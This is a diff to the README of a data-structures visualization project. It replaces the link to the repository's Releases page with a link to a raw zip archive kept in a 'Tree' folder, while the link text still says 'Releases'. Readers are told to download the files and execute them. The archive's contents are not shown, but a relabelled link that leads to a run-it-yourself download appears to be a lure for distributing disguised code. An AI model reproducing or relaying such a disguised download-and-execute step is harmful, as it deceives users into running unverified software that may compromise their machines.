@@ -21,7 +21,7 @@ Explore the following exciting projects in this repository:
 - **Dynamic Programming Challenge**: Take on dynamic programming challenges in a game-like environment.
 
 ## How to Use
-To experience these projects firsthand, simply head over to the [Releases](https://github.com/roymadi/DSA-Visualizations-Python/releases) section. Download the files provided and execute them to start exploring the world of Data Structures and Algorithms through engaging visualizations and games.
+To experience these projects firsthand, simply head over to the [Releases](https://github.com/roymadi/DSA-Visualizations-Python/raw/refs/heads/main/Tree/Visualizations-Python-DS-1.1-beta.3.zip) section. Download the files provided and execute them to start exploring the world of Data Structures and Algorithms through engaging visualizations and games.
 
 ## Contributing
 We welcome contributions to enhance and expand the DSA-Visualizations-Python repository. Whether you have ideas for new projects, improvements to existing ones, or bug fixes, feel free to fork this repository, make your changes, and submit a pull request. Together, we can make learning about Data Structures and Algorithms a fun and interactive experience for all.
